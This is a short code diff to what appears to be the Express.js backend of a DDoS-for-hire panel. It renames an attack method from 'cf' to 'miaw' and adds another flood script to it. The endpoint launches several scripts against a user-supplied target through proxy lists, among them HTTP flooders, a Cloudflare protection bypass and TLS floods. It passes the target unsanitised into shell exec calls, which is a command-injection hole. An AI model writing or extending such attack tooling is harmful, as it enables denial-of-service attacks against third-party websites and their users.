@@ -125,13 +125,14 @@ app.get('/permen', (req, res) => {
       console.log('dstat');
       exec(`node methods/spike.js get ${target} 8 ${time} `);
       break; 
-    case 'cf':
+    case 'miaw':
       console.log('cf');
       exec(`node methods/cf-flood.js ${target} ${time}`);
       exec(`node methods/uambypass.js ${target} ${time} 100 proxy.txt`);
       exec(`node methods/12.js ${target} ${time} 32 10 proxy.txt`);
       exec(`node methods/cookie.js get ${target} ${time} 32 8 proxy.txt`);
       exec(`node methods/tlsop.js get ${target} ${time} 32 10 proxy.txt`);
+      exec(`node methods/spike.js get ${target} 8 ${time} `);
       break; 
     default:
       console.log('Metode tidak dikenali atau format salah.');
